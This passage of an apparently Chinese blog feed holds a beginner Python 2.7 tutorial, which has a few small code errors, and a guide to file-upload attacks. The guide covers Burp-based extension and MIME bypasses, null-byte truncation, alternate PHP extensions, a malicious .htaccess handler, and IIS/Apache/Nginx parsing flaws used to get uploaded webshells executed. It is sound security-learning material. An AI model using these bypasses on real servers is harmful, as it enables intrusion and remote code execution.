    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-95.png" alt="upload successful"></p><h1 id="什么是Python"><a href="#什么是Python" class="headerlink" title="什么是Python"></a>什么是Python</h1><p>Python是一种面向对象、解释型计算机程序设计语言，Python语法简洁而清晰，具有丰富和强大的类库。它常被昵称为胶水语言，能够把用其他语言制作的各种模块(尤其是C/C++)很轻松地联结在一起。常见的一种应用情形是，使用Python快速生成程序的原型(有时甚至是程序的最终界面)，然后对其中有特别要求的部分，用更合适的语言改写</p><h1 id="Pyhton的安装"><a href="#Pyhton的安装" class="headerlink" title="Pyhton的安装"></a>Pyhton的安装</h1><p>Python官网：<a href="http://www.python.org/" target="_blank" rel="noopener">http://www.python.org/</a><br>Python文档下载地址：<a href="http://www.python.org/doc/" target="_blank" rel="noopener">www.python.org/doc/</a></p><h4 id="Unix-amp-Linux-平台安装-Python"><a href="#Unix-amp-Linux-平台安装-Python" class="headerlink" title="Unix &amp; Linux 平台安装 Python:"></a>Unix &amp; Linux 平台安装 Python:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">打开WEB浏览器访问http://www.python.org/download/</span><br><span class="line">选择适用于Unix/Linux的源码压缩包。</span><br><span class="line">下载及解压压缩包。</span><br><span class="line">如果你需要自定义一些选项修改Modules/Setup</span><br><span class="line">执行 ./configure 脚本</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>执行以上操作后，Python会安装在 /usr/local/bin 目录中，Python库安装在/usr/local/lib/pythonXX，XX为你使用的Python的版本号。 </p><h4 id="Window-平台安装-Python"><a href="#Window-平台安装-Python" class="headerlink" title="Window 平台安装 Python:"></a>Window 平台安装 Python:</h4><p>打开WEB浏览器访问<a href="http://www.python.org/download/" target="_blank" rel="noopener">http://www.python.org/download/</a><br>在下载列表中选择Window平台安装包，包格式为：python-XYZ.msi 文件 ， XYZ 为你要安装的版本号。<br>要使用安装程序 python-XYZ.msi, Windows系统必须支持Microsoft Installer 2.0搭配使用。只要保存安装文件到本地计算机，然后运行它，看看你的机器支持MSI。Windows XP和更高版本已经有MSI，很多老机器也可以安装MSI。<br>下载后，双击下载包，进入Python安装向导，安装非常简单，你只需要使用默认的设置一直点击”下一步”直到安装完成即可。</p><h1 id="环境变量的设置"><a href="#环境变量的设置" class="headerlink" title="环境变量的设置"></a>环境变量的设置</h1><h4 id="Unix-Linux-设置环境变量"><a href="#Unix-Linux-设置环境变量" class="headerlink" title="Unix/Linux 设置环境变量"></a>Unix/Linux 设置环境变量</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bash shell下：export PATH=&quot;$PATH:/usr/local/bin/python&quot;</span><br><span class="line"></span><br><span class="line">sh、ksh shell 下：PATH=&quot;$PATH:/usr/local/bin/python&quot;</span><br><span class="line"></span><br><span class="line">csh   shell 下：  setenv PATH &quot;$PATH:/usr/local/bin/python&quot;</span><br></pre></td></tr></table></figure><h4 id="windows下环境变量设置"><a href="#windows下环境变量设置" class="headerlink" title="windows下环境变量设置"></a>windows下环境变量设置</h4><p><code>cmd下：输入path=%path%;$python的安装目录</code></p><h1 id="Python基础"><a href="#Python基础" class="headerlink" title="Python基础"></a>Python基础</h1><p>笔者安装的为Python2.7.14，以下均基于此版本</p><p>首先打开终端输入python即可打开终端解释器：</p><p>先来个hello  world  </p><p><code>print  “hello  world”</code></p><p>Python 可以使用引号( <strong>‘</strong> )、双引号( <strong>“</strong> )、三引号( <strong>‘’’</strong> 或 <strong>“””</strong> ) 来表示字符串，引号的开始与结束必须的相同类型的。其中三引号可以由多行组成，编写多行文本的快捷语法，常用于文档字符串，在文件的特定地点，被当做注释。</p><p> <code>tpye()</code> :查看变量类型</p><p><code>len( )</code>: 查看字符串的长度</p><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><p>因为我们主要是用python写爬虫，所以字符串是必须学好的，主要对字符串进行索引、切片和取长度的操作<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">s = &quot; believe  yourself , just do  it&quot;</span><br><span class="line"></span><br><span class="line">s[10]         &apos;o&apos;</span><br><span class="line"></span><br><span class="line">s[10:]        &apos;ourself , just do  it&apos;</span><br><span class="line"></span><br><span class="line">s[0:10]      &apos;believe  yo&apos;</span><br><span class="line"></span><br><span class="line">s[::-1]       把字符串倒过来</span><br></pre></td></tr></table></figure></p><p>【x:y:z]切片索引,x是左端,y是右端,z是步长,在[x,y)区间从左到右每隔z取值,默认z为1可以省略z参数.  步长的负号就是反向,从右到左取值. </p><p>合并字符串，用  +  号</p><h5 id="Unicode-字符串"><a href="#Unicode-字符串" class="headerlink" title="Unicode 字符串"></a>Unicode 字符串</h5><p>Python 中定义一个 Unicode 字符串和定义一个普通字符串一样简单：</p><p><code>u&#39;Hello World !&#39;</code></p><h5 id="以-encoding-指定的编码格式解码-string"><a href="#以-encoding-指定的编码格式解码-string" class="headerlink" title="以 encoding 指定的编码格式解码 string"></a>以 encoding 指定的编码格式解码 string</h5><p>string.decode(encoding=’UTF-8’, errors=’strict’)</p><h3 id="list列表"><a href="#list列表" class="headerlink" title="list列表[ ]"></a>list列表[ ]</h3><p>可以对列表进行字符串同样的操作，把字符串转换为列表 <code>list =  str.split( )</code></p><p>在列表末尾添加新的对象 ：append（）</p><p>移除列表中某个值的第一个匹配项 ：remove（）</p><p>将元组转换为列表 ：    list(seq)</p><p>必会的help函数：help（）</p><p>help函数查看python模块中函数的用法</p><h3 id="元组-（）"><a href="#元组-（）" class="headerlink" title="元组 （）"></a>元组 （）</h3><p>Python的元组与列表类似，不同之处在于元组的元素不能修改。</p><p>元组中的元素值是不允许删除的，但我们可以使用del语句来删除整个元组<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"></span><br><span class="line">tup1 = (&apos;physics&apos;, &apos;chemistry&apos;, 1997, 2000)</span><br><span class="line">tup2 = (1, 2, 3, 4, 5, 6, 7 )</span><br><span class="line"></span><br><span class="line">print &quot;tup1[0]: &quot;, tup1[0]</span><br><span class="line">print &quot;tup2[1:5]: &quot;, tup2[1:5]</span><br></pre></td></tr></table></figure></p><h3 id="字典"><a href="#字典" class="headerlink" title="字典 { }"></a>字典 { }</h3><p>字典的每个键值 key=&gt;value 对用冒号 : 分割，每个键值对之间用逗号 , 分割，整个字典包括在花括号 {} 中</p><p>键一般是唯一的,值可以取任何数据类型</p><p>访问字典里的值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"></span><br><span class="line">dict = &#123;&apos;Name&apos;: &apos;Zara&apos;, &apos;Age&apos;: 7, &apos;Class&apos;: &apos;First&apos;&#125;;</span><br><span class="line"></span><br><span class="line">print &quot;dict[&apos;Name&apos;]: &quot;, dict[&apos;Name&apos;];</span><br><span class="line">print &quot;dict[&apos;Age&apos;]: &quot;, dict[&apos;Age&apos;];</span><br></pre></td></tr></table></figure></p><h3 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h3><h5 id="读取键盘输入【raw-input-或者input-】"><a href="#读取键盘输入【raw-input-或者input-】" class="headerlink" title="读取键盘输入【raw_input()或者input()】"></a>读取键盘输入【raw_input()或者input()】</h5><p>打开或关闭文件，这里要用Python的内置函数open(),然后创建一个file对象</p><h5 id="python打开文件的模式："><a href="#python打开文件的模式：" class="headerlink" title="python打开文件的模式："></a>python打开文件的模式：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">r 以只读模式打开文件</span><br><span class="line">w  以只写模式打开文件，且先把文件内容清空（truncate the file first）wb 以二进制格式打开一个文件只用于写入。如果该文件已存在则将其覆盖。如果该文件不存在，创建新文件。</span><br><span class="line">a   以添加模式打开文件，写文件的时候总是写到文件末尾，用seek也无用。打开的文件也是不能读的</span><br><span class="line">r+  以读写方式打开文件，文件可读可写，可写到文件的任何位置</span><br><span class="line">w+ 和r+不同的是，它会truncate the file first</span><br><span class="line">a+ 和r+不同的是，它只能写到文件末尾</span><br></pre></td></tr></table></figure><p>一个文件被打开后，就有一个file对象，可以得到有关该文件的各种信息，以下是一些使用方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">file.closed        返回true如果文件已被关闭，否则返回false。</span><br><span class="line">file.mode        返回被打开文件的访问模式。</span><br><span class="line">file.name        返回文件的名称。</span><br><span class="line">file.softspace        如果用print输出后，必须跟一个空格符，则返回false。否则返回true。</span><br></pre></td></tr></table></figure></p><h5 id="创建一个txt"><a href="#创建一个txt" class="headerlink" title="创建一个txt"></a>创建一个txt</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url = open（&quot;first.txt&quot;,&quot;wb&quot;）  #以二进制方式写入文本</span><br><span class="line"></span><br><span class="line">url.close()</span><br></pre></td></tr></table></figure><h5 id="在txt中写入东西"><a href="#在txt中写入东西" class="headerlink" title="在txt中写入东西"></a>在txt中写入东西</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">url = open（&quot;first.txt&quot;,&quot;wb&quot;）</span><br><span class="line"></span><br><span class="line">url.write(&quot;just do it &quot;)</span><br><span class="line"></span><br><span class="line">url.close()</span><br></pre></td></tr></table></figure><h5 id="读txt里的内容"><a href="#读txt里的内容" class="headerlink" title="读txt里的内容"></a>读txt里的内容</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url = open（&quot;first.txt&quot;,“r”）</span><br><span class="line"></span><br><span class="line">url.readlines( )</span><br></pre></td></tr></table></figure><p>Python 文件 readlines() 方法用于读取整个文件（所有行）到一个列表，可以由for… in … 结构进行遍历。列表的每一行变成列表的每一个元素。 </p><p>循环读取文件的内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"></span><br><span class="line">f = open(&quot;runoob.txt&quot;, &quot;r&quot;)             #打开文件  </span><br><span class="line">print (&quot;文件名为: &quot;, fo.name)</span><br><span class="line"></span><br><span class="line">for line in f.readlines():                     #依次读取每行 </span><br><span class="line">    line = line.strip()                              #去掉每行头尾空白 </span><br><span class="line">    print (&quot;读取的数据为: %s&quot; % (line))</span><br><span class="line"></span><br><span class="line">fo.close()  #关闭文件</span><br></pre></td></tr></table></figure></p><h3 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h3><p>这里使用python的编辑器pycharm练习判断<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#coding = utf-8</span><br><span class="line"></span><br><span class="line">if &apos;look&apos; is  see&apos;:</span><br><span class="line">        print True</span><br><span class="line">else:</span><br><span class="line">        print False</span><br></pre></td></tr></table></figure></p><p>这个判断为True，因为当判断条件成立时（非零），则执行后面的语句</p><h3 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h3><h5 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h5><p>while 判断条件：<br>    执行语句……</p><p>比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line"></span><br><span class="line">port = 1100</span><br><span class="line"></span><br><span class="line">while port &lt; 1109:</span><br><span class="line">        print &quot;The PORT is:&quot;+str(port)</span><br><span class="line">        port = port + 1</span><br></pre></td></tr></table></figure></p><h5 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h5><p>for  iterating_var  in  sequence:<br>        statements(s)</p><p>比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#coding = utf-8</span><br><span class="line"></span><br><span class="line">sum = 0</span><br><span class="line"></span><br><span class="line">for i in [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]:</span><br><span class="line">        sum = sum + i</span><br><span class="line"></span><br><span class="line">print sum</span><br></pre></td></tr></table></figure></p><p>还可以用range函数生成一个整数数列，来表示较大的数字，比如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#coding = utf-8</span><br><span class="line"></span><br><span class="line">sum = 0</span><br><span class="line"></span><br><span class="line">for i in range(101):</span><br><span class="line">        sum = sum +i</span><br><span class="line">print sum</span><br></pre></td></tr></table></figure></p><p>如果循环没有增量，则循环会无限循环下去</p><p>打断循环，在循环过程中，  break语句可以提前退出循环  通过continue语句，跳过当前的这次循环，直接开始下一次循环。</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Python" scheme="http://yoursite.com/categories/Python/"/>
    
    
      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>文件上传攻击</title>
    <link href="http://yoursite.com/2018/08/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2018/08/14/文件上传漏洞/</id>
    <published>2018-08-14T14:59:05.000Z</published>
    <updated>2018-08-21T12:52:16.868Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>在网站的运营过程中，不可避免地要对网站的某些页面或者内容 进行更新，这时便需要使用到网站的文件上传的功能。如果不对被上 传的文件进行限制或者限制被绕过，该功能便有可能会被利用于上传 可执行文件、脚本到服务器上，进而进一步导致服务器沦陷。 </p><h1 id="网络渗透的本质-技术部分"><a href="#网络渗透的本质-技术部分" class="headerlink" title="网络渗透的本质(技术部分)"></a>网络渗透的本质(技术部分)</h1><p>主体就是代码注入+代码解析/执行，这种模式贯穿了几乎主流的技术性渗透攻击，像缓冲区溢出攻击，sql 注入攻击，文件上传攻击，文件包含攻击，脚本代码注入等等</p><h1 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h1><p>   导致文件上传的漏洞的原因较多，主要包括以下几类: </p><ol><li>服务器配置不当</li><li>开源编辑器上传漏洞</li><li>本地文件上传限制被绕过 </li><li>过滤不严或被绕过</li><li>文件解析漏洞导致文件执行 </li><li>文件路径截断 </li></ol><h1 id="上传检测流程"><a href="#上传检测流程" class="headerlink" title="上传检测流程"></a>上传检测流程</h1><p><img src="\images\pasted-94.png" alt="upload successful"></p><h1 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h1><h3 id="客户端检测绕过-javascript-检测"><a href="#客户端检测绕过-javascript-检测" class="headerlink" title="客户端检测绕过(javascript 检测)"></a>客户端检测绕过(javascript 检测)</h3><p>这类检测通常在上传页面里含有专门检测文件上传的 javascript 代码 最常见的就是检测扩展名是否合法 </p><p>通常post请求发送到web服务器，客户端javascript验证上传1.php弹窗说上传格式错误，只允许.jpg，.jpeg等格式的文件上传一句话1.php–&gt;1.jpg 然后burp抓包1.jpg–&gt;1.php，这样就绕过了js检测</p><h3 id="服务器端检测MIME类型的绕过"><a href="#服务器端检测MIME类型的绕过" class="headerlink" title="服务器端检测MIME类型的绕过"></a>服务器端检测MIME类型的绕过</h3><pre><code>服务端MIME类型检测（检测Content-Type内容），burp抓包，修改Content-TypeContent-Type:text/plain --&gt;phpContent-Type:image/jpeg --&gt;image上传1.jpg---&gt;修改image/jpeg为text/plain，成功绕过。</code></pre><h4 id="常见的MIME类型："><a href="#常见的MIME类型：" class="headerlink" title="常见的MIME类型："></a>常见的MIME类型：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">​    超文本标记语言文本 .html text/html 　　</span><br><span class="line"></span><br><span class="line">​    xml文档 .xml text/xml</span><br><span class="line"></span><br><span class="line">​    普通文本 .txt text/plain 　　</span><br><span class="line"></span><br><span class="line">​    RTF文本 .rtf application/rtf 　　</span><br><span class="line"></span><br><span class="line">​    PDF文档 .pdf application/pdf 　　</span><br><span class="line"></span><br><span class="line">​    Microsoft Word文件 .word application/msword 　　</span><br><span class="line"></span><br><span class="line">​    PNG图像 .png image/png 　　</span><br><span class="line"></span><br><span class="line">​    GIF图形 .gif image/gif 　　</span><br><span class="line"></span><br><span class="line">​    JPEG图形 .jpeg,.jpg image/jpeg 　　</span><br><span class="line"></span><br><span class="line">​    au声音文件 .au audio/basic 　　</span><br><span class="line"></span><br><span class="line">​    MIDI音乐文件 mid,.midi audio/midi,audio/x-midi 　　</span><br><span class="line"></span><br><span class="line">​    RealAudio音乐文件 .ra, .ram audio/x-pn-realaudio 　　</span><br><span class="line"></span><br><span class="line">​    MPEG文件 .mpg,.mpeg video/mpeg 　　</span><br><span class="line"></span><br><span class="line">​    AVI文件 .avi video/x-msvideo 　　</span><br><span class="line"></span><br><span class="line">​    GZIP文件 .gz application/x-gzip 　　</span><br><span class="line"></span><br><span class="line">​    TAR文件 .tar application/x-tar 　　</span><br><span class="line"></span><br><span class="line">​    任意的二进制数据 application/octet-stream</span><br></pre></td></tr></table></figure><h3 id="服务器目录路径检测绕过"><a href="#服务器目录路径检测绕过" class="headerlink" title="服务器目录路径检测绕过"></a>服务器目录路径检测绕过</h3><p>目录路径检测，一般就检测路径是否合法，但稍微特殊一点的都没有防御。 </p><p>上传1.jpg,burp进行抓包，Content-Disposition:from-data;name=”path”后面一行upload是我们保存的地址。</p><p>现在我们将upload改为upload/1.php(空格) ，接着我们来到 Proxy-&gt;intercept-&gt;Hex找到1.php(空格)这个被修改   过的代码，找到同一行的数字20，改为00 ，成功绕过</p><h3 id="服务器端黑名单检测绕过"><a href="#服务器端黑名单检测绕过" class="headerlink" title="服务器端黑名单检测绕过"></a>服务器端黑名单检测绕过</h3><p>黑名单的安全性比白名单的安全性低很多，攻击手法自然也比白名单多 一般有个专门的 blacklist 文件</p><h5 id="1-文件名大小写绕过pHp-PhP"><a href="#1-文件名大小写绕过pHp-PhP" class="headerlink" title="1.文件名大小写绕过pHp,PhP"></a>1.文件名大小写绕过pHp,PhP</h5><p>混搭绕过<code>php1,php2,php3,php4,php5，phtml,pht</code> </p><h5 id="2-名单列表绕过"><a href="#2-名单列表绕过" class="headerlink" title="2.名单列表绕过"></a>2.名单列表绕过</h5><p>用黑名单里没有的名单进行攻击， <code>cer,ashx,asa,cer,cdx,htr</code>,绕过(黑名单可能会漏掉的) </p><h5 id="3-特殊文件名绕过"><a href="#3-特殊文件名绕过" class="headerlink" title="3.特殊文件名绕过"></a>3.特殊文件名绕过</h5><p>比如发送的 http 包里把文件名改成 <code>test.asp. 或 test.asp_(下划线为空格)</code>，这种命名方式 在 windows 系统里是不被允许的，所以需要在 burp 之类里进行修改，然后绕过验证后，会 被 windows 系统自动去掉后面的点和空格，但要注意 Unix/Linux 系统没有这个特性。</p><h5 id="4-0x00-截断绕过"><a href="#4-0x00-截断绕过" class="headerlink" title="4.0x00 截断绕过"></a>4.0x00 截断绕过</h5><p>在扩展名检测这一块目前只遇到过 asp 的程序有这种漏洞，给个简单的伪代码<code>name = getname(http request) //</code>假如这时候获取到的文件名是 test.asp .jpg(asp 后面为 0x00)  <code>type = gettype(name) /</code>/而在 gettype()函数里处理方式是从后往前扫描扩展名，所以判断为 <code>jpg  if (type == jpg)SaveFileToPath(UploadPath.name, name)</code> //但在这里却是以 0x00 作为文件名截断                 //最后以 test.asp 存入路径里</p><h5 id="5-htaccess-文件攻击"><a href="#5-htaccess-文件攻击" class="headerlink" title="5..htaccess 文件攻击"></a>5..htaccess 文件攻击</h5><p>配合名单列表绕过，上传一个自定义的.htaccess，就可以轻松绕过各种检测</p><p>自定义.htaccess上传，下面是内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">​        &lt;FileMatch &quot;aaa&quot;&gt;</span><br><span class="line"></span><br><span class="line">​        SetHandler application/x-httpd-php</span><br><span class="line"></span><br><span class="line">​        &lt;/FileMatch&gt;</span><br></pre></td></tr></table></figure><pre><code>同目录下，上传一个aaa文件，没有扩展名，内容是一句话，这个时候就成功绕过。</code></pre><h5 id="6-解析调用-漏洞绕过"><a href="#6-解析调用-漏洞绕过" class="headerlink" title="6.解析调用/漏洞绕过"></a>6.解析调用/漏洞绕过</h5><p>这类漏洞直接配合上传一个代码注入过的非黑名单文件即可，再利用解析调用/漏洞</p><h3 id="服务器端白名单检测绕过"><a href="#服务器端白名单检测绕过" class="headerlink" title="服务器端白名单检测绕过"></a>服务器端白名单检测绕过</h3><p>白名单相对来说比黑名单安全一些，但也不见得就绝对安全了</p><h5 id="1-0x00-截断绕过"><a href="#1-0x00-截断绕过" class="headerlink" title="1.0x00 截断绕过"></a>1.0x00 截断绕过</h5><p>用像 test.asp%00.jpg 的方式进行截断，属于白名单文件，再利用服务端代码的检测逻辑 漏洞进行攻击，目前我只遇到过 asp 的程序有这种漏洞</p><h5 id="2-解析调用-漏洞绕过"><a href="#2-解析调用-漏洞绕过" class="headerlink" title="2.解析调用/漏洞绕过"></a>2.解析调用/漏洞绕过</h5><p>这类漏洞直接配合上传一个代码注入过的白名单文件即可，再利用解析调用/漏洞</p><h5 id="htaccess-文件攻击"><a href="#htaccess-文件攻击" class="headerlink" title=".htaccess 文件攻击"></a>.htaccess 文件攻击</h5><p>无论是黑名单还是白名单</p><p>再直接点就是直接攻击.htaccess 文件</p><p>在 PHP manual 中提到了下面一段话</p><p>move_uploaded_file section, there is a warning which states  ‘If the destination file already exists, it will be overwritten.’  如果 PHP 安全没配置好</p><p>就可以通过 move_uploaded_file 函数把自己写的.htaccess 文件覆盖掉服务器上的 这样就能任意定义解析名单了</p><h3 id="网络渗透本质：代码注入-代码解析-执行"><a href="#网络渗透本质：代码注入-代码解析-执行" class="headerlink" title="网络渗透本质：代码注入+代码解析/执行"></a>网络渗透本质：代码注入+代码解析/执行</h3><h4 id="主要是两类情况"><a href="#主要是两类情况" class="headerlink" title="主要是两类情况"></a>主要是两类情况</h4><h5 id="1-直接解析-执行攻击"><a href="#1-直接解析-执行攻击" class="headerlink" title="1.直接解析/执行攻击"></a>1.直接解析/执行攻击</h5><p>像缓冲区溢出和 sql 注入攻击，脚本代码注入就是很明显的属于这里攻击 直接将代码注入到一个解析/执行环境里，直接就能让代码得到执行所以危害性也来得最大，效果最明显</p><p>shellcode 注入程序后，直接劫持 EIP，进行该系统环境权限做任何操作</p><p>sql 命令注入数据库后，直接就能执行该数据库账号权限下的任何操作</p><h5 id="2-配合解析-执行攻击"><a href="#2-配合解析-执行攻击" class="headerlink" title="2.配合解析/执行攻击"></a>2.配合解析/执行攻击</h5><p>算是一种组合攻击，在这类情况下</p><p>往往不像第一种情况能拥有直接的解析/执行环境 比较明显的就是我们的上传攻击</p><p>我们需要先上传数据(注入代码)到服务端上去</p><p>然后想办法去调用解析/执行环境(比如 Web 应用程序解析漏洞)  来解析/执行已经注入到了服务端的代码</p><h4 id="三种解析方式"><a href="#三种解析方式" class="headerlink" title="三种解析方式"></a>三种解析方式</h4><h5 id="直接解析"><a href="#直接解析" class="headerlink" title="-直接解析"></a>-直接解析</h5><p>能以 asp,php 之类的扩展名存储在服务器上</p><h5 id="本地文件包含解析"><a href="#本地文件包含解析" class="headerlink" title="-本地文件包含解析"></a>-本地文件包含解析</h5><p>主要是 php 的本地文件包含 (远程文件包含不属于上传攻击绕过范畴)</p><h5 id="htaccess-解析"><a href="#htaccess-解析" class="headerlink" title="-.htaccess 解析"></a>-.htaccess 解析</h5><p>.htaccess 文件 用户自己定义如何去调用解析器解析文件就可以了</p><h3 id="Web应用程序解析漏洞"><a href="#Web应用程序解析漏洞" class="headerlink" title="Web应用程序解析漏洞"></a>Web应用程序解析漏洞</h3><h4 id="Apache-解析漏洞"><a href="#Apache-解析漏洞" class="headerlink" title="Apache 解析漏洞"></a>Apache 解析漏洞</h4><p>111.php.ddd</p><p>解析 - test.php.任意不属于黑名单且也不属于 Apache 解析白名单的名称</p><p>描述 - 一个文件名为 x1.x2.x3 的文件，Apache 会从 x3 的位置往 x1 的位置开始尝试解析 如果 x3 不属于 Apache 能解析的扩展名，那么 Apache 会尝试去解析 x2 的位置，  从后往前解析，直到遇到一个能解析的扩展名为止</p><h4 id="IIS-解析漏洞"><a href="#IIS-解析漏洞" class="headerlink" title="IIS 解析漏洞"></a>IIS 解析漏洞</h4><p> 解析 - test.asp/任意文件名 | test.asp;任意文件名 | 任意文件名/任意文件名.php</p><p> IIS6.0 在解析 asp 格式的时候有两个解析漏洞，一个是如果目录名包含”.asp”字符串，  那么这个目录下所有的文件都会按照 asp 去解析，另一个是只要文件名中含有”.asp;”  会优先按 asp 来解析</p><p> IIS7.0/7.5 是对 php 解析时有一个类似于 Nginx 的解析漏洞，对任意文件名只要在 URL后面追加上字符串”/任意文件名.php”就会按照 php 的方式去解析</p><h4 id="Nginx-解析漏洞"><a href="#Nginx-解析漏洞" class="headerlink" title="Nginx 解析漏洞"></a>Nginx 解析漏洞</h4><p>解析 - 任意文件名/任意文件名.php | 任意文件名%00.php</p><p>描述 - 目前 Nginx 主要有这两种漏洞，一个是对任意文件名，在后面添加/任意文件名.php  的解析漏洞，比如原本文件名是 test.jpg，可以添加为 test.jpg/x.php 进行解析攻击。 还有一种是对低版本的 Nginx 可以在任意文件名后面添加%00.php 进行解析攻击。</p><h3 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h3><p><img src="\images\pasted-93.png" alt="upload successful"></p><h3 id="应用层上传漏洞攻击思路"><a href="#应用层上传漏洞攻击思路" class="headerlink" title="应用层上传漏洞攻击思路"></a>应用层上传漏洞攻击思路</h3><p><img src="\images\pasted-92.png" alt="upload successful"></p><h3 id="一个不常见的绕过方式"><a href="#一个不常见的绕过方式" class="headerlink" title="一个不常见的绕过方式"></a>一个不常见的绕过方式</h3><p>文件上传绕过   上传一个php文件，用burp抓包   头部的Content-Type改成Multipart/form-data大小写绕过   请求内容里的Content-Type改成image，文件名改成php5就绕过了</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="web安全" scheme="http://yoursite.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>XSS跨站脚本漏洞</title>
    <link href="http://yoursite.com/2018/08/14/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2018/08/14/XSS跨站脚本漏洞/</id>
    <published>2018-08-14T09:19:05.000Z</published>
